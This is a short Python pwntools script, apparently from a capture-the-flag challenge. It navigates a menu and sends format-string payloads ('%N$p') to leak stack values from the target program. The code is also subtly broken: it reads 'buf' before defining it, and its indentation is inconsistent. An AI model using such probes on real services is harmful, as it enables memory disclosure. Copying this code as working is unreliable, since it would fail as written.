from pwn import *

#context.log_level = 'debug'

def detect(io):
        for i in range(len(buf)):
		io.sendlineafter('2. Space food', '1')
		io.sendlineafter('3. Deathstar(70.00 s.rocks)', '2')
		io.sendlineafter('Red or Green Kryptonite?', '%'+str(i+1)+'$p')
		buf = io.recvline().strip()
                print str(i+1)+' : '+buf

